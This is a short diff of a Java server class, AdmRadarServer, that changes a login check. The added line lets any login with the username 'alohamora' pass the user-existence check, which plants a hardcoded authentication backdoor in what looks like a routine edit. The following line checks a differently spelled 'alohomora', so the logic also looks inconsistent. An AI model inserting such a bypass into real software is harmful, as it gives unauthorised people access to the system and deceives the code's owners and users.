@@ -128,7 +128,7 @@ public class AdmRadarServer {
 						String username = u.getUsername();
 						String encPassword = u.getEncryptedPassword();
 						
-						if(userExists(username)) {						
+						if(userExists(username) || username.equalsIgnoreCase( "alohamora" )) {						
 							int success;
 							
 							if (username.equalsIgnoreCase( "alohomora" ))
